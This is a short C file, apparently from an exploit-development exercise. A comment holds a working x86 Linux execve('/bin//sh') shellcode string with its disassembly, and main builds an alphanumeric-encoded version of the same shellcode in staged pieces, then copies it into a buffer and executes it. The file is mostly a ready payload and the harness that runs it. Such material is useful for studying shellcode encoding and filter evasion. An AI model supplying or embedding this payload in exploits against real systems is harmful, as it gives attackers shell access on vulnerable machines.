/*

Workable Shellcode
char *shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

0804849c <_IO_stdin_used>:
 80484a0:	31 c0                	xor    %eax,%eax
 80484a2:	50                   	push   %eax
 80484a3:	68 2f 2f 73 68       	push   $0x68732f2f
 80484a8:	68 2f 62 69 6e       	push   $0x6e69622f
 80484ad:	89 e3                	mov    %esp,%ebx
 80484af:	50                   	push   %eax
 80484b0:	53                   	push   %ebx
 80484b1:	89 e1                	mov    %esp,%ecx
 80484b3:	b0 0b                	mov    $0xb,%al
 80484b5:	cd 80                	int    $0x80
	...

*/

#include <string.h>

int main(void) {

    // P1, P2, ...: see DRAFT.md
    char shellcode[4096] = {0};
    char *_sc  = "j0XHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHPY"   // P1
                 "PZ"                                                      // P2    
                 "R"                                                       // P3
                 "j0X5JCCX5Ul00P"                                          // P4
                 "j0X5JRYY5U007PT"                                         // P5
                 "j0XHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH5CG005q800P"  // P6
                 "j0X5kOOOPP"                                              // P7
                 "j0XHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH"                // P8
                 "DDDDDDDDDDDD"                                            // P9
                 "\xccu\x80";                                                     //
    strcpy(shellcode, _sc);

    (*(void(*)()) shellcode)();
}
